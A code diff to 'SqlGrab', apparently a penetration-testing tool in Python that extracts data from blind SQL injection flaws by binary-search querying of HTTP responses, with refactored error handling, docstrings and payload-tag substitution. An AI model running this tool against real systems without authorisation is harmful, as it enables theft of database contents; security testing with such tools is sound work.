@@ -12,6 +12,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 class HTTPRequest(BaseHTTPRequestHandler):
+    ''' Used for parsing raw HTTP requests '''
     def __init__(self, request_text):
         self.rfile = BytesIO(request_text)
         self.raw_requestline = self.rfile.readline()
@@ -24,9 +25,7 @@ class HTTPRequest(BaseHTTPRequestHandler):
 
 
 class SqlGrab:
-    """
-
-    """
+    ''' Extracts string data from a conditional SQLi vulnerability using a binary search tree approach. '''
 
     payloads = {
         'mysql': {
@@ -54,7 +53,6 @@ class SqlGrab:
     initialLength = 16
     initialCharacter = ord('Z')
     payloadLocations = []
-
 
     def __init__(self, options):
         # set options
@@ -84,21 +82,16 @@ class SqlGrab:
 
             # retrieve the output
             result = self.getString(query=options.query, length=length)
-            print(f'\n{result}')
+            print(f'\n{result}\n')
 
-        except RuntimeError:
-            print('[!] The result was invalid, either due to a syntax error or because no result exists. Send the requests to Repeater and sanity check them.', file=sys.stderr)
         except Exception as e:
             print(e)
         except KeyboardInterrupt:
             print('\n[!] Interrupted')
 
-    def isMatch(self, response):  # Change me to whatever condition counts as True
+    def isMatch(self, response):
+        ''' Takes a conditional statement from command line arguments and determines the truth value of the query based on it. '''
         return eval(self.condition, locals())
-        # examples:
-        # return response.status_code == 403
-        # return response.elapsed > datetime.timedelta(milliseconds=100)
-        # return len(response.content) > 11443
 
     def getValue(self, payload, args, range=(0, math.inf), context=None, ):
         """ Determines the value of a vairable based on iterative halving/doubling of the search space """
@@ -127,7 +120,8 @@ class SqlGrab:
 
         # sanity check
         if not self.getMatch(payload, dict(**args, operator='=')):
-            raise RuntimeError
+            raise RuntimeError(
+                '[!] The result was invalid, either due to a syntax error or because no result exists. Send the requests to Repeater and sanity check them.')
 
         return args['value']
 
@@ -150,25 +144,27 @@ class SqlGrab:
 
         # sanity check
         if not self.getMatch(self.payloads['string'], args=dict(**args, value=result, operator='=')):
-            raise RuntimeError
+            raise RuntimeError(
+                '[!] The result was invalid, either due to a syntax error or because no result exists. Send the requests to Repeater and sanity check them.')
 
         return result
 
     def getMatch(self, payload, args):
         """Issues a request and determines truth value of query based on the response"""
 
-        payload = payload.format(**args)
-
         prepared = self.request.prepare()
 
+        payload = payload.format(**args)
         if self.urlencode:
             urllib.parse.quote_plus(payload)
 
-        # perform subsitution and optional encoding depending on location
+        # perform {payload} tag subsitution
+        prepared.url.replace('%7Bpayload%7D', urllib.parse.quote_plus(
+            payload))  # URL payload will always be urlencoded
 
-        prepared.url.format(payload=payload)
         if prepared.body:
             prepared.body.format(payload=payload)
+
         prepared.headers = dict([(k, v.format(payload=payload))
                                 for k, v in prepared.headers.items()])
 
@@ -181,6 +177,7 @@ class SqlGrab:
         return self.isMatch(response)
 
     def parseRequest(self, host, filename):
+        ''' Parses a raw HTTP request from file and verifies it contains at least one {payload} tag. Creates a HTTPRequest from the parsed content. '''
         with open(filename, 'rb') as fp:
 
             parser = HTTPRequest(fp.read())
@@ -201,6 +198,7 @@ class SqlGrab:
 
             # scan the parsed request for payload tags before preparing it
             tag = '{payload}'
+
             if tag in request.url:
                 self.payloadLocations.append('url')
             if request.data and tag in request.data:
@@ -231,7 +229,8 @@ if __name__ == "__main__":
                         help='SQL query to extract the response of. Must return a single string, e.g. @@version, SELECT user FROM dual')
     parser.add_argument('-d', '--dbms', required=True,
                         choices=['mysql', 'mssql', 'oracle', 'postgresql'])
-    parser.add_argument('-c', '--condition', required=True, help='Python expression to evaluate to determine true/false from the response. E.g. \'"error" in response.text\', \'response.error_code == 401\', \'len(response.content) > 1433\'')
+    parser.add_argument('-c', '--condition', required=True,
+                        help='Python expression to evaluate to determine true/false from the response. E.g. \'"error" in response.text\', \'response.status_code == 401\', \'len(response.content) > 1433\'')
     parser.add_argument('--delay', required=False, default=0,
                         help='Delay in seconds to add between requests. Optional. E.g. 1, 0.2')
     parser.add_argument('--urlencode', required=False, action='store_false',
